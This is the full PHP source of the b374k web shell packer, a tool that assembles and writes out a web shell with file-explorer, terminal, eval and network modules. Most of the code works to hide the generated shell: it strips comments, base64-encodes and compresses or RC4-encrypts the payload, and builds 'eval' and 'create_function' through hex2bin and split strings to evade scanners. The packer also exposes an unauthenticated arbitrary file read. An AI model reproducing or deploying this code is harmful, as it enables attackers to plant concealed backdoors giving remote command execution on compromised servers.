<?php
/*
	b374k shell
	Jayalah Indonesiaku
	(c)2014
	https://github.com/b374k/b374k

	Version 4.1
	@phith0n
	https://github.com/phith0n/b374k

*/
$GLOBALS['packer']['title'] = "b374k shell packer";
$GLOBALS['packer']['version'] = "0.4.5";
$GLOBALS['packer']['base_dir'] = "./base/";
$GLOBALS['packer']['module_dir'] = "./module/";
$GLOBALS['packer']['theme_dir'] = "./theme/";
$GLOBALS['packer']['module'] = packer_get_module();
$GLOBALS['packer']['theme'] = packer_get_theme();
$GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
$GLOBALS['packer']['resources_dir'] = "./resources/";
$GLOBALS['cipher_key'] = generateRandomString(32);

require $GLOBALS['packer']['base_dir'].'jsPacker.php';

/* PHP FILES START */
$base_code = "";

$resources_data = packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
$res_files = scandir($GLOBALS['packer']['resources_dir']);
$resources_content = "";
foreach($res_files as $res) {
    if(!in_array($res, array(".",".."))) {
        $res_data = packer_read_file($GLOBALS['packer']['resources_dir'] . $res);
        $info = pathinfo($res);
        $ext = $info['extension'];
        if($ext == 'png' || $ext == 'jpg' || $ext == 'jpeg') {
            $res_data = "data:image/".$ext.";base64," . base64_encode($res_data);
        }
        $resources_content .= "\$GLOBALS['resources']['" . basename($res, '.'.$ext) . "'] = '" . base64_encode(gzdeflate($res_data, 9)) . "';\n";
    }
}
$resources_data = str_replace("//<__RES__>", $resources_content, $resources_data);
$base_code .= $resources_data;

$module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
/* PHP FILES END */

/* JAVASCRIPT AND CSS FILES START */
$zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
$js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");
$js_local_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."localmain.js");


if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
else $theme ="default";
$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");

/* JAVASCRIPT AND CSS FILES END */

// layout
$layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
$p = array_map("rawurldecode", packer_get_post());

if(isset($_SERVER['REMOTE_ADDR'])){
	if(isset($p['read_file'])){
		$file = $p['read_file'];
		if(is_file($file)){
			packer_output(packer_html_safe(packer_read_file($file)));
		}
		packer_output('error');
	}
	elseif(isset($_GET['run'])){
		if(empty($_GET['run'])) $modules = array();
		else $modules = explode("," ,$_GET['run']);
		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_local_code;
		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."localmain.php");
		$rs_content = trim($module_init)."?>".$base_code.$module_code.$layout;
		eval($rs_content);
		die();
	}
	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
		$outputfile = trim($p['outputfile']);
		if(empty($outputfile)) $outputfile = 'b374k.php';
		$password = trim($p['password']);
		$modules = trim($p['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = trim($p['strip']);
		$base64 = trim($p['base64']);
		$compress = trim($p['compress']);
		$compress_level = (int) $p['compress_level'];
		$encode = addslashes(trim($p['encode']));

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";

		}

		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);


		$htmlcode = trim($layout);
		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);

		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
	}
	else{
	
	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
	foreach($GLOBALS['packer']['theme'] as $k){
		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
		else $available_themes .= "<option>".$k."</option>";
	}
	$available_themes .= "</select></td></tr>";

	?><!doctype html>
	<html>
	<head>
	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
	<meta charset='utf-8'>
	<meta name='robots' content='noindex, nofollow, noarchive'>
	<style type="text/css">
	<?php echo $css_code;?>
	#devTitle{
		font-size:18px;
		text-align:center;
		font-weight:bold;
	}
	</style>
	</head>
	<body>

	<div id='wrapper' style='padding:12px'>
		<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></div>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td colspan='2'>
				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
				<span class='button' id='runGo'>Run</span>
				</form>
			</td></tr>
		</table>
		<br>
		<table class='boxtbl'>
			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
			<?php echo $available_themes; ?>
			<tr><td>Strip Comments and Whitespaces</td><td>
				<select id='strip' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr><td>Base64 Encode</td><td>
				<select id='base64' style='width:150px;'>
					<option selected="selected">yes</option>
					<option>no</option>
				</select>
			</td></tr>

			<tr id='compress_row'><td>Compress</td><td>
				<select id='compress' style='width:150px;'>
					<option>no</option>
					<option selected="selected">gzdeflate</option>
					<option>gzencode</option>
					<option>gzcompress</option>
                    <option>rc4</option>
				</select>
				<select id='compress_level' style='width:150px;'>
					<option>1</option>
					<option>2</option>
					<option>3</option>
					<option>4</option>
					<option>5</option>
					<option>6</option>
					<option>7</option>
					<option>8</option>
					<option selected="selected">9</option>
				</select>
			</td></tr>
			<tr><td style='width:220px;'>Encode</td><td><input id='encode' type='text' value='utf-8'></td></tr>

			<tr><td colspan='2'>
				<span class='button' id='packGo'>Pack</span>
			</td></tr>
			<tr><td colspan='2' id='result'></td></tr>
			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
		</table>
	</div>

	<script type='text/javascript'>
	var init_shell = false;
	<?php echo $zepto_code;?>
	<?php echo $js_local_code;?>

	var targeturl = '<?php echo packer_get_self(); ?>';
	var debug = false;

	Zepto(function($){
		refresh_row();

		$('#runGo').on('click', function(e){
			module = $('#module').val();
			$('#module_to_run').val(module);
			$('#runForm').submit();
		});

		$('#base64').on('change', function(e){
			refresh_row();
		});

		$('#packGo').on('click', function(e){
			outputfile = $('#outputfile').val();
			password = $('#password').val();
			module = $('#module_to_pack').val();
			strip = $('#strip').val();
			base64 = $('#base64').val();
			compress = $('#compress').val();
			compress_level = $('#compress_level').val();
			encode = $('#encode').val();

			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode}, function(res){
				splits = res.split('{[|b374k|]}');
				$('#resultContent').html(splits[1]);
				$('#result').html(splits[0]);
			});

		});
		
		$('.theme').on('change', function(e){
			$('.theme').val($(this).val());
			set_cookie('packer_theme', $('.theme').val());
			location.href = targeturl;
		});
	});

	function refresh_row(){
		base64 = $('#base64').val();
		if(base64=='yes'){
			$('#compress_row').show();
		}
		else{
			$('#compress_row').hide();
			$('#compress').val('no');
		}
	}

	</script>
	</body>
	</html><?php
	}
}
else{
	$output = $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version']."\n\n";

	if(count($argv)<=1){
		$output .= "options :\n";
        $output .= "\t-d\t\t\t\t\tdev mode\n";
		$output .= "\t-o filename\t\t\t\tsave as filename\n";
		$output .= "\t-p password\t\t\t\tprotect with password\n";
		$output .= "\t-t theme\t\t\t\ttheme to use\n";
		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
		$output .= "\t-b\t\t\t\t\tencode with base64\n";
		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress|rc4]\tcompression (use only with -b)\n";
		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
		$output .= "\t-l\t\t\t\t\tlist available modules\n";
		$output .= "\t-k\t\t\t\t\tlist available themes\n";
		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312/gbk..\n";
	}
	else{
		$opt = getopt("do:p:t:m:sbz:c:lku:");

        if (isset($opt['d'])) {
            $GLOBALS['cipher_key'] = 'QtIRzust76zO1haRabFYkbBv9WDnGvTx';
        }

		if(isset($opt['l'])){
			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
			echo $output;
			die();
		}
		
		if(isset($opt['k'])){
			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
			echo $output;
			die();
		}

		if(isset($opt['o'])&&(trim($opt['o'])!='')){
			$outputfile = trim($opt['o']);
		}
		else{
			$output .= "error : no filename given (use -o filename)\n\n";
			echo $output;
			die();
		}

		$password = isset($opt['p'])? trim($opt['p']):"";
		$theme = isset($opt['t'])? trim($opt['t']):"default";
		if(!in_array($theme, $GLOBALS['packer']['theme'])){
			$output .= "error : unknown theme file\n\n";
			echo $output;
			die();
		}
		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
		
		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = isset($opt['s'])? "yes":"no";
		$base64 = isset($opt['b'])? "yes":"no";
		$encode = isset($opt['u'])? addslashes(strtolower($opt['u'])):"utf-8";

		$compress = isset($opt['z'])? trim($opt['z']):"no";
		if(!in_array($compress, array('gzdeflate','gzencode','gzcompress','rc4','no'))){
			$output .= "error : unknown options -z ".$compress."\n\n";
			echo $output;
			die();
		}
		else{
			if(($base64=='no')&&($compress!='no')){
				$output .= "error : use -z options only with -b\n\n";
				echo $output;
				die();
			}
		}

		$compress_level = isset($opt['c'])? trim($opt['c']):"";
		if(empty($compress_level)) $compress_level = '9';
		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
			echo $output;
			die();
		}
		$compress_level = (int) $compress_level;

		$output .= "Filename\t\t: ".$outputfile."\n";
		$output .= "Password\t\t: ".$password."\n";
		$output .= "Theme\t\t\t: ".$theme."\n";
		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
		$output .= "Strip\t\t\t: ".$strip."\n";
		$output .= "Base64\t\t\t: ".$base64."\n";
		$output .= "RC4 Cipher Key\t\t: " . $GLOBALS['cipher_key'] . "\n";
		$output .= "Code\t\t\t: " . $encode . "\n";
		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
        // $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."md5.js");
		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) {
			    $php_data = packer_read_file($filename.".php");

                if($module == 'network') {
                    $files = scandir($GLOBALS['packer']['network_rs_dir']);
                    $rs_content = "";
                    foreach($files as $rs) {
                        if(!in_array($rs, array(".",".."))) {
                            $rs_data = packer_read_file($GLOBALS['packer']['network_rs_dir'] . $rs);
                            $info = pathinfo($rs);
                            $rs_content .= "\$GLOBALS['resources']['rs_" . basename($rs, '.'.$info['extension']) . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
                        }
                    }
                    $php_data = str_replace("//<__RS__>", $rs_content, $php_data);
                }

			    $module_code .= $php_data;
            }
			if(is_file($filename.".js")) {
			    $js_code .= "\n".packer_read_file($filename.".js")."\n";
            }
		}

		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$htmlcode = trim($layout);
		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);

		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
		$status = explode("{[|b374k|]}", $res);
		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
	}
	echo $output;
}

function packer_read_file($file){
	$content = false;
	if($fh = @fopen($file, "rb")){
		$content = "";
		while(!feof($fh)){
		  $content .= fread($fh, 8192);
		}
	}
	return $content;
}

function packer_write_file($file, $content){
	if($fh = @fopen($file, "wb")){
		if(fwrite($fh, $content)!==false){
			if(!class_exists("ZipArchive")) return true;
			
			if(file_exists($file.".zip")) unlink ($file.".zip");
			$zip = new ZipArchive();
			$filename = "./".$file.".zip";

			if($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;
			$zip->addFile($file);
			$zip->close();
			return true;
		}
		fclose($fh);
	}
	return false;
}

function packer_get_post(){
	return packer_fix_magic_quote($_POST);
}

function packer_fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				if(is_array($v)) $arr[$k] = clean($v);
				else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
			}
		}
	}
	return $arr;
}

function packer_html_safe($str){
	return htmlspecialchars($str, 2 | 1);
}

function packer_wrap_with_quote($str){
	return "\"".$str."\"";
}

function packer_output($str){
	header("Content-Type: text/plain");
	header("Cache-Control: no-cache");
	header("Pragma: no-cache");
	echo $str;
	die();
}

function packer_get_self(){
	$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";	
	return packer_html_safe($_SERVER['SCRIPT_NAME'].$query);
}

function packer_strips($str){
	$newStr = '';

	$commentTokens = array(T_COMMENT);

	if(defined('T_DOC_COMMENT')) $commentTokens[] = T_DOC_COMMENT;
	if(defined('T_ML_COMMENT'))	$commentTokens[] = T_ML_COMMENT;

	$tokens = token_get_all($str);

	foreach($tokens as $token){
		if (is_array($token)) {
			if (in_array($token[0], $commentTokens)) continue;
			$token = $token[1];
		}
	$newStr .= $token;
	}
	$newStr = preg_replace("/(\s{2,})/", " ", $newStr);
	return $newStr;
}

function packer_get_theme(){
	$available_themes = array();
	foreach(glob($GLOBALS['packer']['theme_dir']."*.css") as $filename){
		$filename = basename($filename, ".css");
		$available_themes[] = $filename;
	}
	return $available_themes;
}

function packer_get_module(){
	$available_modules = array();
	foreach(glob($GLOBALS['packer']['module_dir']."*.php") as $filename){
		$filename = basename($filename, ".php");
		if(packer_check_module($filename)) $available_modules[] = $filename;
	}
	return $available_modules;
}

function packer_check_module($module){
	$filename = $GLOBALS['packer']['module_dir'].$module;
	if(is_file($filename.".php")){
		$content = packer_read_file($filename.".php");
		@eval("?>".$content);
		if($GLOBALS['module'][$module]['id']==$module) return true;
	}
	return false;
}

function packer_pack_js($str){
	$packer = new JavaScriptPacker($str, 0, true, false);
	return $packer->pack();
}

function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
	$content = "";
	if(is_file($output)){
		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
	}

	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".sha1(md5($password))."\"; // X-Csrf-Token\n";
	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";

	$compress_level = (int) $compress_level;
	if($compress_level<0) $compress_level = 0;
	elseif($compress_level>9) $compress_level = 9;

	$version = "";
	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
		$version = $r[1];
	}
	
	$header = "<?php\n";
	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';


	if($strip=='yes'){
		$phpcode = packer_strips($phpcode);
		$htmlcode = preg_replace("/(\ {2,}|\n{2,}|\t+)/", "", $htmlcode);
		$htmlcode = preg_replace("/\r/", "", $htmlcode);
		$htmlcode = preg_replace("/}\n+/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+}/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+{/", "{", $htmlcode);
		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
	}


	$content = $phpcode.$htmlcode;
	$content = preg_replace('/^<\?php/s', '<?php ' . $cipher_key, $content);

	if($compress=='gzdeflate'){
		$content = gzdeflate($content, $compress_level);
		$encoder_func = "gz'.'in'.'fla'.'te";
	}
	elseif($compress=='gzencode'){
		$content = gzencode($content, $compress_level);
		$encoder_func = "gz'.'de'.'co'.'de";
	}
	elseif($compress=='gzcompress'){
		$content = gzcompress($content, $compress_level);
		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
	}
	elseif($compress=="rc4"){
		$content = rc4($GLOBALS['cipher_key'], bzcompress($content, $compress_level));
		$encoder_func = "r"."c4";
	}
	else{
		$encoder_func = "";
	}

	if($base64=='yes'){
		$content = base64_encode($content);
		if($compress!='no'){
			if($compress=="rc4") {
				$encoder = "bds(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
			} else {
				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
			}
		}
		else{
			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
		}

		$func = '_'.generateRandomString(4);
		$code = $header.$password."\$cf=hex2bin('".bin2hex("create_function")."');\$".$func."=\$cf('\$x',hex2bin('".bin2hex("eval")."').'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
	}
	else{
		if($compress!='no'){
			$encoder = $encoder_func."(\$x)";
		}
		else{
			$code = $header.$password."?>".$content;
			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
		}
	}

	if(is_file($output)) unlink($output);
	if(packer_write_file($output, $code)){
		chmod($output, 0777);
		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
	}
	return "error{[|b374k|]}";
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}

?>
